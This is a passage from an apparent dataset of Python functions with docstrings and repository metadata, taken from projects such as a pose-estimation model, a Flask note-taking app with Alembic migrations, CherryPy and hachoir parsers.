((cls_dets[:, 3] - cls_dets[:, 1]) * (cls_dets[:, 2] - cls_dets[:, 0]) >= min_box_size))[0]\n    cls_dets = cls_dets[keep]\n    if len(cls_dets) > 0:\n        if nms_method == 'nms':\n            keep = gpu_nms(cls_dets, nms_thresh)\n        elif nms_method == 'soft':\n            keep = cpu_soft_nms(np.ascontiguousarray(cls_dets, dtype=np.float32), method=2)\n        else:\n            assert False\n    cls_dets = cls_dets[keep]\n    test_data = np.asarray(test_data)[keep]\n\n    if len(keep) == 0:\n        continue\n\n    # crop and detect keypoints\n    cls_skeleton = np.zeros((len(test_data), cfg.nr_skeleton, 3))\n    crops = np.zeros((len(test_data), 4))\n    cfg.batch_size = 32\n    batch_size = cfg.batch_size // 2\n    for test_id in range(0, len(test_data), batch_size):\n        start_id = test_id\n        end_id = min(len(test_data), test_id + batch_size)\n\n        test_imgs = []\n        details = []\n        for i in range(start_id, end_id):\n            test_img, detail = Preprocessing(test_data[i], stage='test')\n            test_imgs.append(test_img)\n            details.append(detail)\n\n        details = np.asarray(details)\n        feed = test_imgs\n        for i in range(end_id - start_id):\n            ori_img = test_imgs[i][0].transpose(1, 2, 0)\n            flip_img = cv2.flip(ori_img, 1)\n            feed.append(flip_img.transpose(2, 0, 1)[np.newaxis, ...])\n        feed = np.vstack(feed)\n\n        res = tester.predict_one([feed.transpose(0, 2, 3, 1).astype(np.float32)])[0]\n        res = res.transpose(0, 3, 1, 2)\n\n        for i in range(end_id - start_id):\n            fmp = res[end_id - start_id + i].transpose((1, 2, 0))\n            fmp = cv2.flip(fmp, 1)\n            fmp = list(fmp.transpose((2, 0, 1)))\n            for (q, w) in cfg.symmetry:\n                fmp[q], fmp[w] = fmp[w], fmp[q]\n            fmp = np.array(fmp)\n            res[i] += fmp\n            res[i] /= 2\n\n        for test_image_id in range(start_id, end_id):\n            r0 = res[test_image_id - start_id].copy()\n            r0 /= 255.\n            r0 += 0.5\n            for w in range(cfg.nr_skeleton):\n                res[test_image_id - start_id, w] /= np.amax(res[test_image_id - start_id, w])\n            border = 10\n            dr = np.zeros((cfg.nr_skeleton, cfg.output_shape[0] + 2 * border, cfg.output_shape[1] + 2 * border))\n            dr[:, border:-border, border:-border] = res[test_image_id - start_id][:cfg.nr_skeleton].copy()\n            for w in range(cfg.nr_skeleton):\n                dr[w] = cv2.GaussianBlur(dr[w], (21, 21), 0)\n            for w in range(cfg.nr_skeleton):\n                lb = dr[w].argmax()\n                y, x = np.unravel_index(lb, dr[w].shape)\n                dr[w, y, x] = 0\n                lb = dr[w].argmax()\n                py, px = np.unravel_index(lb, dr[w].shape)\n                y -= border\n                x -= border\n                py -= border + y\n                px -= border + x\n                ln = (px ** 2 + py ** 2) ** 0.5\n                delta = 0.25\n                if ln > 1e-3:\n                    x += delta * px / ln\n                    y += delta * py / ln\n                x = max(0, min(x, cfg.output_shape[1] - 1))\n                y = max(0, min(y, cfg.output_shape[0] - 1))\n                cls_skeleton[test_image_id, w, :2] = (x * 4 + 2, y * 4 + 2)\n                cls_skeleton[test_image_id, w, 2] = r0[w, int(round(y) + 1e-10), int(round(x) + 1e-10)]\n            # map back to original images\n            crops[test_image_id, :] = details[test_image_id - start_id, :]\n            for w in range(cfg.nr_skeleton):\n                cls_skeleton[test_image_id, w, 0] = cls_skeleton[test_image_id, w, 0] / cfg.data_shape[1] * (\n                crops[test_image_id][2] - crops[test_image_id][0]) + crops[test_image_id][0]\n                cls_skeleton[test_image_id, w, 1] = cls_skeleton[test_image_id, w, 1] / cfg.data_shape[0] * (\n                crops[test_image_id][3] - crops[test_image_id][1]) + crops[test_image_id][1]\n    all_res[-1] = [cls_skeleton.copy(), cls_dets.copy()]\n\n    cls_partsco = cls_skeleton[:, :, 2].copy().reshape(-1, cfg.nr_skeleton)\n    cls_skeleton[:, :, 2] = 1\n    cls_scores = cls_dets[:, -1].copy()\n\n    # rescore\n    cls_dets[:, -1] = cls_scores * cls_partsco.mean(axis=1)\n    cls_skeleton = np.concatenate(\n        [cls_skeleton.reshape(-1, cfg.nr_skeleton * 3), (cls_scores * cls_partsco.mean(axis=1))[:, np.newaxis]],\n        axis=1)\n    for i in range(len(cls_skeleton)):\n        result = dict(image_id=im_info['image_id'], category_id=1, score=float(round(cls_skeleton[i][-1], 4)),\n                      keypoints=cls_skeleton[i][:-1].round(3).tolist())\n        dump_results.append(result)\n\nreturn all_res, dump_results", "path": "models\\COCO.res50.384x288.CPN\\mptest.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"Calculate the average gradient for each shared variable across all towers.\nNote that this function provides a synchronization point across all towers.\nArgs:\n  tower_grads: List of lists of (gradient, variable) tuples. The outer list\n    is over individual gradients. The inner list is over the gradient\n    calculation for each tower.\nReturns:\n   List of pairs of (gradient, variable) where the gradient has been averaged\n   across all towers.\n\"\"\"\n", "func_signal": "def sum_gradients(tower_grads):\n", "code": "sum_grads = []\nfor grad_and_vars in zip(*tower_grads):\n    if grad_and_vars[0][0] is None:\n        print('No gradient on var {}'.format(grad_and_vars[0][1].name))\n        continue\n    # Note that each grad_and_vars looks like the following:\n    #   ((grad0_gpu0, var0_gpu0), ... , (grad0_gpuN, var0_gpuN))\n    grads = []\n    for g, _ in grad_and_vars:\n        # Add 0 dimension to the gradients to represent the tower.\n        if g is not None:\n            expanded_g = tf.expand_dims(g, 0)\n\n            # Append on a 'tower' dimension which we will average over below.\n            grads.append(expanded_g)\n\n    # Average over the 'tower' dimension.\n    grad = tf.concat(axis=0, values=grads)\n    grad = tf.reduce_sum(grad, 0)\n\n    # Keep in mind that the Variables are redundant because they are shared\n    # across towers. So .. we will just return the first tower's pointer to\n    # the Variable.\n    v = grad_and_vars[0][1]\n    grad_and_var = (grad, v)\n    sum_grads.append(grad_and_var)\nreturn sum_grads", "path": "lib\\tfflat\\net_utils.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"Locate the CUDA environment on the system\n\nReturns a dict with keys 'home', 'nvcc', 'include', and 'lib64'\nand values giving the absolute path to each directory.\n\nStarts by looking for the CUDAHOME env variable. If not found, everything\nis based on finding 'nvcc' in the PATH.\n\"\"\"\n\n# first check if the CUDAHOME env variable is in use\n", "func_signal": "def locate_cuda():\n", "code": "if 'CUDAHOME' in os.environ:\n    home = os.environ['CUDAHOME']\n    nvcc = pjoin(home, 'bin', 'nvcc')\nelse:\n    # otherwise, search the PATH for NVCC\n    default_path = pjoin(os.sep, 'usr', 'local', 'cuda', 'bin')\n    nvcc = find_in_path('nvcc', os.environ['PATH'] + os.pathsep + default_path)\n    if nvcc is None:\n        raise EnvironmentError('The nvcc binary could not be '\n            'located in your $PATH. Either add it to your path, or set $CUDAHOME')\n    home = os.path.dirname(os.path.dirname(nvcc))\n\ncudaconfig = {'home':home, 'nvcc':nvcc,\n              'include': pjoin(home, 'include'),\n              'lib64': pjoin(home, 'lib64')}\nfor k, v in cudaconfig.items():\n    if not os.path.exists(v):\n        raise EnvironmentError('The CUDA %s path could not be located in %s' % (k, v))\n\nreturn cudaconfig", "path": "lib\\lib_kernel\\lib_nms\\setup.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"\nYields:\n    Batched data by stacking each component on an extra 0th dimension.\n\"\"\"\n", "func_signal": "def get_data(self):\n", "code": "holder = []\nfor data in self.ds.get_data():\n    holder.append(data)\n    if len(holder) == self.batch_size:\n        yield BatchData._aggregate_batch(holder, self.use_list)\n        del holder[:]", "path": "lib\\tfflat\\data_provider.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"\nArgs:\n    ds (DataFlow): input DataFlow\n    func (datapoint -> datapoint | None): takes a datapoint and returns a new\n        datapoint. Return None to discard this datapoint.\n\"\"\"\n", "func_signal": "def __init__(self, ds, func):\n", "code": "self.ds = ds\nself.func = func", "path": "lib\\tfflat\\data_provider.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "# set log\n", "func_signal": "def __init__(self, log_dir, log_name='train_logs.txt'):\n", "code": "self._logger = logging.getLogger(log_name)\nself._logger.setLevel(logging.INFO)\nlog_file = os.path.join(log_dir, log_name)\nif not os.path.exists(log_dir):\n    os.makedirs(log_dir)\nfile_log = logging.FileHandler(log_file, mode='a')\nfile_log.setLevel(logging.INFO)\nconsole_log = logging.StreamHandler()\nconsole_log.setLevel(logging.INFO)\nformatter = logging.Formatter(\n    \"{}%(asctime)s{} %(message)s\".format(GREEN, END),\n    \"%m-%d %H:%M:%S\")\nfile_log.setFormatter(formatter)\nconsole_log.setFormatter(formatter)\nself._logger.addHandler(file_log)\nself._logger.addHandler(console_log)", "path": "lib\\tfflat\\logger.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "# round-robin assignment\n", "func_signal": "def _send(self, dp):\n", "code": "worker = next(self._iter_worker)\nmsg = [worker, dumps(dp)]\nself.socket.send_multipart(msg, copy=False)", "path": "lib\\tfflat\\data_provider.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.create_table('tags',\nsa.Column('id', sa.Integer(), nullable=False),\nsa.Column('tag', sa.String(length=200), nullable=True),\nsa.PrimaryKeyConstraint('id')\n)\nop.create_table('users',\nsa.Column('id', sa.Integer(), nullable=False),\nsa.Column('email', sa.String(length=254), nullable=True),\nsa.Column('username', sa.String(length=64), nullable=True),\nsa.Column('password_hash', sa.String(length=256), nullable=True),\nsa.Column('confirmed', sa.Boolean(), nullable=True),\nsa.Column('avatar_hash', sa.String(length=32), nullable=True),\nsa.Column('created_date', sa.DateTime(), nullable=True),\nsa.Column('updated_date', sa.DateTime(), nullable=True),\nsa.PrimaryKeyConstraint('id')\n)\nop.create_index(op.f('ix_users_email'), 'users', ['email'], unique=True)\nop.create_index(op.f('ix_users_username'), 'users', ['username'], unique=True)\nop.create_table('notebooks',\nsa.Column('id', sa.Integer(), nullable=False),\nsa.Column('title', sa.String(length=200), nullable=True),\nsa.Column('is_deleted', sa.Boolean(), nullable=True),\nsa.Column('author_id', sa.Integer(), nullable=True),\nsa.ForeignKeyConstraint(['author_id'], ['users.id'], ),\nsa.PrimaryKeyConstraint('id')\n)\nop.create_table('notes',\nsa.Column('id', sa.Integer(), nullable=False),\nsa.Column('title', sa.String(length=200), nullable=True),\nsa.Column('body', sa.Text(), nullable=True),\nsa.Column('body_html', sa.Text(), nullable=True),\nsa.Column('created_date', sa.DateTime(), nullable=True),\nsa.Column('updated_date', sa.DateTime(), nullable=True),\nsa.Column('author_id', sa.Integer(), nullable=True),\nsa.Column('notebook_id', sa.Integer(), nullable=True),\nsa.Column('is_deleted', sa.Boolean(), nullable=True),\nsa.Column('is_favorite', sa.Boolean(), nullable=True),\nsa.Column('is_archived', sa.Boolean(), nullable=True),\nsa.Column('search_vector', sqlalchemy_utils.types.ts_vector.TSVectorType(), nullable=True),\nsa.ForeignKeyConstraint(['author_id'], ['users.id'], ),\nsa.ForeignKeyConstraint(['notebook_id'], ['notebooks.id'], ),\nsa.PrimaryKeyConstraint('id')\n)\nop.create_index(op.f('ix_notes_created_date'), 'notes', ['created_date'], unique=False)\nop.create_index('ix_notes_search_vector', 'notes', ['search_vector'], unique=False, postgresql_using='gin')\nop.create_index(op.f('ix_notes_updated_date'), 'notes', ['updated_date'], unique=False)\nop.create_table('note_tag',\nsa.Column('note_id', sa.Integer(), nullable=True),\nsa.Column('tag_id', sa.Integer(), nullable=True),\nsa.ForeignKeyConstraint(['note_id'], ['notes.id'], ondelete='CASCADE'),\nsa.ForeignKeyConstraint(['tag_id'], ['tags.id'], ondelete='CASCADE')\n)\n### end Alembic commands ###", "path": "migrations\\versions\\3b4b395f61a9_initial_migration.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Update single notebook.\n\nArgs:\n    notebook_id (int, required): The id of the Notebook\n\nArgs: (Via Request Paramaters)\n    title: (string, optional): New Title for the Notebook\n    is_deleted: (bool, optional): Is the notebook deleted?\n\nReturns:\n    JSON representation of the notebook\n\"\"\"\n", "func_signal": "def put(self, notebook_id):\n", "code": "self.parser.add_argument(\n    'title', type=str,\n    help=\"Title of the Notebook\")\nself.parser.add_argument(\n    'is_deleted', type=bool, help=\"True if notebook is deleted\")\nargs = self.parser.parse_args()\nnotebook = self.get_notebook(notebook_id)\n\nfor arg in args:\n    if args[str(arg)] is not None:\n        setattr(notebook, arg, args[str(arg)])\n\ndb.session.add(notebook)\ndb.session.commit()\nreturn {'notebook': notebook.to_json()}", "path": "app\\api_v1\\notebooks.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.add_column('users', sa.Column('username', sa.VARCHAR(length=64), autoincrement=False, nullable=True))\nop.create_index('ix_users_username', 'users', ['username'], unique=True)\nop.drop_column('users', 'last_name')\nop.drop_column('users', 'first_name')\n### end Alembic commands ###", "path": "migrations\\versions\\b237b9f6a2ce_update_user_model_remove_username_add_.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.drop_column('users', 'last_name')\nop.drop_column('users', 'first_name')\n### end Alembic commands ###\nwith op.batch_alter_table(\"notes\") as batch_op:\n    batch_op.drop_constraint(\n        \"notes_author_id_fkey\", type_=\"foreignkey\")\nwith op.batch_alter_table(\"notebooks\") as batch_op:\n    batch_op.drop_constraint(\n        \"notebooks_author_id_fkey\", type_=\"foreignkey\")\nop.create_foreign_key(\n    \"notes_author_id_fkey\", \"notes\", \"users\", \n    [\"author_id\"], [\"id\"], ondelete=\"CASCADE\")\nop.create_foreign_key(\n    \"notebooks_author_id_fkey\", \"notebooks\", \"users\", \n    [\"author_id\"], [\"id\"], ondelete=\"CASCADE\")", "path": "migrations\\versions\\3a37e844b277_alter_constraints.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.add_column('users', sa.Column('first_name', sa.VARCHAR(length=200), autoincrement=False, nullable=True))\nop.add_column('users', sa.Column('last_name', sa.VARCHAR(length=200), autoincrement=False, nullable=True))\n### end Alembic commands ###", "path": "migrations\\versions\\3a37e844b277_alter_constraints.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "# Will neeed to use headers twice\n", "func_signal": "def test_delete_notebook(self):\n", "code": "local_headers = self.headers\n\n# Create new Notebook\nself.client.post(\n    url_for('api.notebooks'),\n    headers=local_headers,\n    data=json.dumps({\n        \"title\": \"Test Notebook Title\"\n    }))\n\n# Update Notebook Title\nresponse = self.client.delete(\n    url_for('api.notebook', notebook_id=1),\n    headers=local_headers)\n\nself.assertTrue(response.status_code == 200)", "path": "tests\\test_api_notebooks.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "# Will neeed to use headers twice\n", "func_signal": "def test_create_notebook(self):\n", "code": "local_headers = self.headers\n\nresponse = self.client.post(\n    url_for('api.notebooks'),\n    headers=local_headers,\n    data=json.dumps({\n        \"title\": \"Test Notebook Title\"\n    }))\n\njson_response = json.loads(response.data.decode('utf-8'))\n\nself.assertTrue(response.status_code == 201)\nself.assertEqual(\n    'Test Notebook Title', json_response['notebook']['title'])\n\n# Test to make sure new notebook shows up in all notebooks\nresponse = self.client.get(\n    url_for('api.notebooks'),\n    headers=local_headers)\nself.assertTrue(response.status_code == 200)\nself.assertTrue(\n    'Test Notebook Title' in response.get_data(as_text=True))", "path": "tests\\test_api_notebooks.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Return JWT Token\"\"\"\n", "func_signal": "def get(self):\n", "code": "token = g.user.generate_auth_token()\nreturn {'token': token.decode('ascii')}", "path": "app\\api_v1\\authentication.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Run deployment tasks.\"\"\"\n", "func_signal": "def deploy():\n", "code": "from flask_migrate import upgrade\n\n# migrate database to latest revision\nupgrade()", "path": "manage.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_table('note_tag')\nop.drop_index(op.f('ix_notes_updated_date'), table_name='notes')\nop.drop_index('ix_notes_search_vector', table_name='notes')\nop.drop_index(op.f('ix_notes_created_date'), table_name='notes')\nop.drop_table('notes')\nop.drop_table('notebooks')\nop.drop_index(op.f('ix_users_username'), table_name='users')\nop.drop_index(op.f('ix_users_email'), table_name='users')\nop.drop_table('users')\nop.drop_table('tags')\n### end Alembic commands ###", "path": "migrations\\versions\\3b4b395f61a9_initial_migration.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Delete single notebook.\n\nArgs:\n    notebook_id (int, required): The id of the Notebook\n\nReturns:\n    \"deleted\" if succeesful\n\"\"\"\n", "func_signal": "def delete(self, notebook_id):\n", "code": "db.session.delete(self.get_notebook(notebook_id))\ndb.session.commit()\nreturn {'notebook': 'deleted'}", "path": "app\\api_v1\\notebooks.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def downgrade():\n", "code": "op.drop_column('notebooks', 'updated_date')\nop.drop_column('notebooks', 'created_date')\n### end Alembic commands ###", "path": "migrations\\versions\\5d3c326dd901_add_created_and_updated_date_to_notebook.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Start the application under the code profiler.\"\"\"\n", "func_signal": "def profile(length=25, profile_dir=None):\n", "code": "from werkzeug.contrib.profiler import ProfilerMiddleware\napp.wsgi_app = ProfilerMiddleware(app.wsgi_app, restrictions=[length],\n                                  profile_dir=profile_dir)\napp.run()", "path": "manage.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.add_column('users', sa.Column('first_name', sa.String(length=200), nullable=True))\nop.add_column('users', sa.Column('last_name', sa.String(length=200), nullable=True))\nop.drop_index('ix_users_username', table_name='users')\nop.drop_column('users', 'username')\n### end Alembic commands ###", "path": "migrations\\versions\\b237b9f6a2ce_update_user_model_remove_username_add_.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Update single user.\n\"\"\"\n", "func_signal": "def put(self):\n", "code": "self.parser.add_argument(\n    'default_notebook', type=int,\n    help=\"ID of the Default Notebook\")\nargs = self.parser.parse_args()\nuser = g.user\n\nfor arg in args:\n    if args[str(arg)] is not None:\n        setattr(user, arg, args[str(arg)])\n\ndb.session.add(user)\ndb.session.commit()\nreturn {'notebook': notebook.to_json()}", "path": "app\\api_v1\\user.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "# Will neeed to use headers twice\n", "func_signal": "def test_get_single_notebook(self):\n", "code": "local_headers = self.headers\n\n# Create new Notebook\nself.client.post(\n    url_for('api.notebooks'),\n    headers=local_headers,\n    data=json.dumps({\n        \"title\": \"Test Notebook Title\"\n    }))\n\nresponse = self.client.get(\n    url_for('api.notebook', notebook_id=1),\n    headers=local_headers)\n\nself.assertTrue(response.status_code == 200)\nself.assertTrue(\n    'Test Notebook Title' in response.get_data(as_text=True))", "path": "tests\\test_api_notebooks.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "# Will neeed to use headers twice\n", "func_signal": "def test_update_notebook(self):\n", "code": "local_headers = self.headers\n\n# Create new Notebook\nself.client.post(\n    url_for('api.notebooks'),\n    headers=local_headers,\n    data=json.dumps({\n        \"title\": \"Test Notebook Title\"\n    }))\n\n# Update Notebook Title\nresponse = self.client.put(\n    url_for('api.notebook', notebook_id=1),\n    headers=local_headers,\n    data=json.dumps({\n        \"title\": \"Updated Test Notebook Title\"\n    }))\n\nself.assertTrue(response.status_code == 200)\nself.assertTrue(\n    'Updated Test Notebook Title' in response.get_data(as_text=True))\n\n# Update Notebook Deleted Status\nresponse = self.client.put(\n    url_for('api.notebook', notebook_id=1),\n    headers=local_headers,\n    data=json.dumps({\n        \"is_deleted\": True\n    }))\n\njson_response = json.loads(response.data.decode('utf-8'))\nself.assertTrue(response.status_code == 200)\nself.assertTrue(json_response['notebook']['is_deleted'])\n\n# Undo Deletion\nresponse = self.client.put(\n    url_for('api.notebook', notebook_id=1),\n    headers=local_headers,\n    data=json.dumps({\n        \"is_deleted\": False\n    }))\n\njson_response = json.loads(response.data.decode('utf-8'))\nself.assertTrue(response.status_code == 200)\nself.assertFalse(json_response['notebook']['is_deleted'])", "path": "tests\\test_api_notebooks.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Run the unit tests.\"\"\"\n", "func_signal": "def test(coverage=False):\n", "code": "import sys\nif coverage and not os.environ.get('FLASK_COVERAGE'):\n    os.environ['FLASK_COVERAGE'] = '1'\n    os.execvp(sys.executable, [sys.executable] + sys.argv)\nimport unittest\nimport xmlrunner\ntests = unittest.TestLoader().discover('tests')\nresults = xmlrunner.XMLTestRunner(output='test-reports').run(tests)\nif COV:\n    COV.stop()\n    COV.save()\n    print('Coverage Summary:')\n    COV.report()\n    basedir = os.path.abspath(os.path.dirname(__file__))\n    covdir = os.path.join(basedir, 'test-reports/coverage')\n    COV.html_report(directory=covdir)\n    print('HTML version: file://%s/index.html' % covdir)\n    COV.erase()\nif (len(results.failures) > 0 or len(results.errors) > 0):\n    sys.exit(1)", "path": "manage.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Return list of all notebooks.\"\"\"\n", "func_signal": "def get(self):\n", "code": "return {'notebooks': list(map(\n    lambda notebook: notebook.to_json(), g.user.notebooks.all()))}", "path": "app\\api_v1\\notebooks.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "### commands auto generated by Alembic - please adjust! ###\n", "func_signal": "def upgrade():\n", "code": "op.add_column('notebooks', sa.Column('created_date', sa.DateTime(), nullable=True))\nop.add_column('notebooks', sa.Column('updated_date', sa.DateTime(), nullable=True))\n### end Alembic commands ###", "path": "migrations\\versions\\5d3c326dd901_add_created_and_updated_date_to_notebook.py", "repo_name": "levlaz/braindump", "stars": 531, "license": "mit", "language": "python", "size": 6383}
{"docstring": "\"\"\"Return the html tags in the 's' string containing the 'cont'\nstring; if toClosure is True, everything between the opening\ntag and the closing tag is returned.\"\"\"\n", "func_signal": "def _getTagsWith(s, cont, toClosure=False, maxRes=None):\n", "code": "lres = []\nbi = s.find(cont)\nif bi != -1:\n    btag = s[:bi].rfind('<')\n    if btag != -1:\n        if not toClosure:\n            etag = s[bi+1:].find('>')\n            if etag != -1:\n                endidx = bi+2+etag\n                lres.append(s[btag:endidx])\n                if maxRes is not None and len(lres) >= maxRes: return lres\n                lres += _getTagsWith(s[endidx:], cont,\n                                    toClosure=toClosure)\n        else:\n            spaceidx = s[btag:].find(' ')\n            if spaceidx != -1:\n                ctag = '</%s>' % s[btag+1:btag+spaceidx]\n                closeidx = s[bi:].find(ctag)\n                if closeidx != -1:\n                    endidx = bi+closeidx+len(ctag)\n                    lres.append(s[btag:endidx])\n                    if maxRes is not None and len(lres) >= maxRes:\n                        return lres\n                    lres += _getTagsWith(s[endidx:], cont,\n                                        toClosure=toClosure)\nreturn lres", "path": "library\\imdb\\parser\\mobile\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Log an access message to the app.log or global log as appropriate.\"\"\"\n", "func_signal": "def access(self):\n", "code": "try:\n    return request.app.log.access()\nexcept AttributeError:\n    return _cplogging.LogManager.access(self)", "path": "cherrypy\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Normalize the retrieve html.\"\"\"\n", "func_signal": "def _clean_html(self, html):\n", "code": "html = re_spaces.sub(' ', html)\n# Remove silly &nbsp;&raquo; chars.\nhtml = html.replace('&nbsp;&raquo;', '')\nreturn subXMLRefs(html)", "path": "library\\imdb\\parser\\mobile\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Color names in #RRGGBB format, given the number of bits for each component.\"\"\"\n", "func_signal": "def color_name(data, bits):\n", "code": "ret = [\"#\"]\nfor i in range(3):\n    ret.append(\"%02X\" % (data[i] << (8-bits[i])))\nreturn ''.join(ret)", "path": "library\\hachoir_parser\\game\\blp.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Expose the function, optionally providing an alias or set of aliases.\"\"\"\n", "func_signal": "def expose(func=None, alias=None):\n", "code": "def expose_(func):\n    func.exposed = True\n    if alias is not None:\n        if isinstance(alias, basestring):\n            parents[alias.replace(\".\", \"_\")] = func\n        else:\n            for a in alias:\n                parents[a.replace(\".\", \"_\")] = func\n    return func\n\nimport sys, types\nif isinstance(func, (types.FunctionType, types.MethodType)):\n    if alias is None:\n        # @expose\n        func.exposed = True\n        return func\n    else:\n        # func = expose(func, alias)\n        parents = sys._getframe(1).f_locals\n        return expose_(func)\nelif func is None:\n    if alias is None:\n        # @expose()\n        parents = sys._getframe(1).f_locals\n        return expose_\n    else:\n        # @expose(alias=\"alias\") or\n        # @expose(alias=[\"alias1\", \"alias2\"])\n        parents = sys._getframe(1).f_locals\n        return expose_\nelse:\n    # @expose(\"alias\") or\n    # @expose([\"alias1\", \"alias2\"])\n    parents = sys._getframe(1).f_locals\n    alias = func\n    return expose_", "path": "cherrypy\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "\"\"\"Mount the given root, start the builtin server (and engine), then block.\n\nroot: an instance of a \"controller class\" (a collection of page handler\n    methods) which represents the root of the application.\nscript_name: a string containing the \"mount point\" of the application.\n    This should start with a slash, and be the path portion of the URL\n    at which to mount the given root. For example, if root.index() will\n    handle requests to \"http://www.example.com:8080/dept/app1/\", then\n    the script_name argument would be \"/dept/app1\".\n    \n    It MUST NOT end in a slash. If the script_name refers to the root\n    of the URI, it MUST be an empty string (not \"/\").\nconfig: a file or dict containing application config. If this contains\n    a [global] section, those entries will be used in the global\n    (site-wide) config.\n\"\"\"\n", "func_signal": "def quickstart(root=None, script_name=\"\", config=None):\n", "code": "if config:\n    _global_conf_alias.update(config)\n\ntree.mount(root, script_name, config)\n\nif hasattr(engine, \"signal_handler\"):\n    engine.signal_handler.subscribe()\nif hasattr(engine, \"console_control_handler\"):\n    engine.console_control_handler.subscribe()\n\nengine.start()\nengine.block()", "path": "cherrypy\\__init__.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
{"docstring": "# Signature\n", "func_signal": "def createFields(self):\n", "code": "yield Bytes(self, \"ole_id\", 8, \"OLE object signature\")\n\nheader = Header(self, \"header\")\nyield header\n\n# Configure values\nself.sector_size = (8 << header[\"bb_shift\"].value)\nself.fat_count = header[\"bb_count\"].value\nself.items_per_bbfat = self.sector_size / SECT.static_size\nself.ss_size = (8 << header[\"sb_shift\"].value)\nself.items_per_ssfat = self.items_per_bbfat\n\n# Read DIFAT (one level of indirection)\nyield DIFat(self, \"difat\",  header[\"db_start\"].value, header[\"db_count\"].value, \"Double Indirection FAT\")\n\n# Read FAT (one level of indirection)\nfor field in self.readBFAT():\n    yield field\n\n# Read SFAT\nfor field in self.readSFAT():\n    yield field\n\n# Read properties\nchain = self.getChain(self[\"header/bb_start\"].value)\nprop_per_sector = self.sector_size // Property.static_size\nself.properties = []\nfor block in chain:\n    self.seekBlock(block)\n    for index in xrange(prop_per_sector):\n        property = Property(self, \"property[]\")\n        yield property\n        self.properties.append(property)\n\n# Parse first property\nfor index, property in enumerate(self.properties):\n    if index == 0:\n        name = \"root\"\n    else:\n        try:\n            name = PROPERTY_NAME[property[\"name\"].value]\n        except LookupError:\n            name = property.name+\"content\"\n    for field in self.parseProperty(property, name):\n        yield field", "path": "library\\hachoir_parser\\misc\\ole2.py", "repo_name": "CouchPotato/CouchPotatoV1", "stars": 836, "license": "gpl-3.0", "language": "python", "size": 8442}
